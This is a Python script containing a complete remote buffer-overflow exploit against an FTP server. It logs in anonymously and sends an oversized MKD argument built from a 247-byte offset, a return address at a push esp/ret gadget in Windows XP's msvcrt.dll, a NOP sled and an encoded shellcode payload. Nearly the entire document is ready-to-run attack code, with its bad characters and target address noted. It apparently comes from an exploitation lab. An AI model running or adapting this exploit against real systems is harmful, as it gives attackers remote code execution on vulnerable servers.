import socket
import sys

'''
Badchars: \x00\x0A\x0D

0x77c35459 : push esp # ret  |  {PAGE_EXECUTE_READ} [msvcrt.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v7.0.2600.5512 (C:\WINDOWS\system32\msvcrt.dll)'''

buf =  ""
buf += "\xdb\xdb\xd9\x74\x24\xf4\xbe\x9a\x2f\x01\x48\x5d\x31"
buf += "\xc9\xb1\x54\x31\x75\x18\x03\x75\x18\x83\xc5\x9e\xcd"
buf += "\xf4\xb4\x76\x93\xf7\x44\x86\xf4\x7e\xa1\xb7\x34\xe4"
buf += "\xa1\xe7\x84\x6e\xe7\x0b\x6e\x22\x1c\x98\x02\xeb\x13"
buf += "\x29\xa8\xcd\x1a\xaa\x81\x2e\x3c\x28\xd8\x62\x9e\x11"
buf += "\x13\x77\xdf\x56\x4e\x7a\x8d\x0f\x04\x29\x22\x24\x50"
buf += "\xf2\xc9\x76\x74\x72\x2d\xce\x77\x53\xe0\x45\x2e\x73"
buf += "\x02\x8a\x5a\x3a\x1c\xcf\x67\xf4\x97\x3b\x13\x07\x7e"
buf += "\x72\xdc\xa4\xbf\xbb\x2f\xb4\xf8\x7b\xd0\xc3\xf0\x78"
buf += "\x6d\xd4\xc6\x03\xa9\x51\xdd\xa3\x3a\xc1\x39\x52\xee"
buf += "\x94\xca\x58\x5b\xd2\x95\x7c\x5a\x37\xae\x78\xd7\xb6"
buf += "\x61\x09\xa3\x9c\xa5\x52\x77\xbc\xfc\x3e\xd6\xc1\x1f"
buf += "\xe1\x87\x67\x6b\x0f\xd3\x15\x36\x47\x10\x14\xc9\x97"
buf += "\x3e\x2f\xba\xa5\xe1\x9b\x54\x85\x6a\x02\xa2\xea\x40"
buf += "\xf2\x3c\x15\x6b\x03\x14\xd1\x3f\x53\x0e\xf0\x3f\x38"
buf += "\xce\xfd\x95\xd5\xcb\x69\xba\x35\xd5\x06\xaa\x4b\xd5"
buf += "\xc9\x76\xc5\x33\xb9\xd6\x85\xeb\x79\x87\x65\x5c\x11"
buf += "\xcd\x69\x83\x01\xee\xa3\xac\xab\x01\x1a\x84\x43\xbb"
buf += "\x07\x5e\xf2\x44\x92\x1a\x34\xce\x17\xda\xfa\x27\x5d"
buf += "\xc8\xea\x59\x9d\x10\xea\xf3\x9d\x7a\xee\x55\xc9\x12"
buf += "\xec\x80\x3d\xbd\x0f\xe7\x3d\xba\xef\x76\x74\xb0\xd9"
buf += "\xec\x38\xae\x25\xe1\xb8\x2e\x73\x6b\xb9\x46\x23\xcf"
buf += "\xea\x73\x2c\xda\x9e\x2f\xb8\xe5\xf6\x9c\x6b\x8e\xf4"
buf += "\xfb\x5b\x11\x06\x2e\xd8\x56\xf8\xac\xfc\xfe\x91\x4e"
buf += "\x40\xff\x61\x25\x40\xaf\x09\xb2\x6f\x40\xfa\x3b\xba"
buf += "\x09\x92\xb6\x2a\xfb\x03\xc6\x67\x5d\x9a\xc7\x8b\x46"
buf += "\xcb\x49\x6c\x79\xf4\xab\x51\xaf\xcd\xd9\x92\x73\x6a"
buf += "\xd1\xa9\xd6\xdb\x78\xd1\x45\x1b\xa9"


buffer = "\x90"*20 + buf
evil = "A"*247 + "\x59\x54\xc3\x77" + buffer +  "C"*(700-len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
con = s.connect(("172.31.1.205", 21))

s.recv(1024)
s.send("USER anonymous\r\n")
s.recv(1024)
s.send("PASS anonymous\r\n")
s.recv(1024)
s.send("MKD " + evil + "\r\n")
s.recv(1024)
s.send("QUIT\r\n")
s.close()

